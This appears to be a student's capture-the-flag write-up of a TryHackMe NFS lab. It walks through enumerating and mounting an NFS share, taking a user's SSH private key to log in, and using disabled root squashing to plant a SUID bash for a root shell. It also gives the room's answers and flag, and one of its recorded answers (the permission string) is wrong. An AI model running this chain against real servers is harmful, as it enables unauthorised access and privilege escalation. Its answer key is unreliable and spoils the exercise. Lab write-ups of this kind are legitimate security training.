# Network services 2
## Understanding NFS
#### What is NFS?
NFS stands for "**Network File System**" and allows a system to share directories and files with others over a network.
#### How does NFS work?
1.  The client will request to **mount** a directory from a remote host on a local directory.
2. The mount service will then act to connect to the relevant mount daemon using **RPC**.
3. The server checks if the user has permission to mount whatever directory has been requested.
4. It will then return **a file handle** which uniquely identifies each file and directory that is on the server.
#### What runs NFS?
Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

   + **_Answers_**
   
    What does NFS stand for?
    - Network File System.
    What process allows an NFS client to interact with a remote directory as though it was a physical device?
    - mounting 
    What does NFS use to represent files and directories on the server?
    - file handle
    What protocol does NFS use to communicate between the server and client?
    - RPC
    What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2
    - user id / group id
    Can a Windows NFS server share files with a Linux client? (Y/N)
    - Y
    Can a Linux NFS server share files with a MacOS client? (Y/N)
    - Y
    What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.
    - 4.2

## Enumerating NFS
#### What is Enumeration?
the process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system.
###### Enumeration is used to gather the following:
 Usernames, group names ,Hostnames, Network shares and services, IP tables and routing tables
 Service settings and audit configurations, Application and banners, SNMP and DNS details
 #### NFS-Common
It's a package includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs.
We are concerned with "**showmount**" and **"mount.nfs"** as these are useful when it comes to extracting information from the NFS share.
###### Nfs-common installation
    sudo apt-get install nfs-common
##### Enumeration steps
1. **Port scanning** (_to find out as much information as you can about the services, open ports and operating system of the target machine_) using nmap with the -A and -p- tags.
2. **Mounting NFS shares** : The client’s system needs a directory where all the content shared by the host server in the export folder can be accessed.create
this folder anywhere on your system.Now, use the "mount" command to connect the NFS share to the mount point on client's machine.
###### creat the mount point with

    sudo mount -t nfs IP:share /tmp/mount/ -nolock
**_Answers_**

        Conduct a thorough port scan scan of your choosing, how many ports are open?
        - 7        "scanning with (nmap -A -T4  10.10.57.87 -p- -vv) command"
        Which port contains the service we're looking to enumerate?
        -2049      "from scanning"
         what is the name of the visible share?
        - /home    "use (/usr/sbin/showmount -e 10.10.57.87) command"
        what is the name of the folder inside?
        - cappucino   "use (sudo mount -t nfs 10.10.57.87:/home /tmp/mount/ -nolock) command             then /tmp/mount/ and ls"
        Which of these folders could contain keys that would give us remote access to the               server?
        - .ssh  "use(ls -lah or -a)"
        Which of these keys is most useful to us?
        - id_rsa " use( cd .ssh) then ( ls -lah or -a)"   id_rsa is the private key.
        
        Copy this file to a different location your local machine, and change the                       permissions to "600" using "chmod 600 [file]". 
        Assuming we were right about what type of directory this is, we can pretty easily               work out the name of the user this key corresponds to.   
        Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)
       - cp id_rsa ~/id_rsa   "make a copy in home directory"
       - sudo chmod 600 id_rsa    "change the permission"
       - cat is_rsa.pub            "to get the username"
       - sudo ssh -i id_rsa cappucino@10.10.57.87     "to access remotly" 
## Exploiting NFS

- Root Squashing is enabled by default on NFS shares, and prevents anyone connecting to the NFS share from having root access to the NFS volume.
- If the root squashing is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.
##### what are files with the SUID bit set?
the file or files can be run with the permissions of the file(s)owner/group.
**_Answers_**

      First, change directory to the mount point on your machine, where the NFS            share should still be mounted, and then into the user's home directory.
       ###### password is password 
   
   
![image](https://github.com/user-attachments/assets/6149195f-946d-4797-b0e2-fc8d6b7530ac)



      Download the bash executable to your Downloads directory. Then use "cp                ~/Downloads/bash ." to copy the bash executable to the NFS share. The             copied bash shell must be owned by a root user, you can set this using "sudo       chown root bash"
      1- copy the  .bash from  its directory to the nfs share 
   
  ![image](https://github.com/user-attachments/assets/65039afd-37f6-4bb5-b3c4-bf0447447982)

      2- change the file owner by a root user

   ![image](https://github.com/user-attachments/assets/59a39c19-2545-45f1-af53-e8dd512f789f)

      Now, we're going to add the SUID bit permission to the bash executable we           just copied to the share using "sudo chmod +[permission] bash". What letter         do we use to set the SUID bit set using chmod?
      - s
   
   ![image](https://github.com/user-attachments/assets/6a879b90-ce73-485b-88af-526ce71d2505)

      Let's do a sanity check, let's check the permissions of the "bash" executable       using "ls -la bash". What does the permission set look like? Make sure              that it ends with -sr-x.
      - -rwxr-xr-x
      Now, SSH into the machine as the user. List the directory to make sure the          bash executable is there. Now, the moment of truth. Lets run it with
      "./bash -p". The -p persists the permissions, so that it can run as root with       SUID- as otherwise bash will sometimes drop the permissions.
      Great! If all's gone well you should have a shell as root! What's the root          flag?
      - THM{nfs_got_pwned}

   ![image](https://github.com/user-attachments/assets/e638c2f3-5f1f-44c8-a08a-eb9caa6f7ce4)
.![image](https://github.com/user-attachments/assets/18ea8c1e-720a-4fff-85ed-695677d6696a)
![image](https://github.com/user-attachments/assets/f3ccd626-31ec-4b11-9e93-ce1caf9ff177)



      
      
   




        

    



  




    


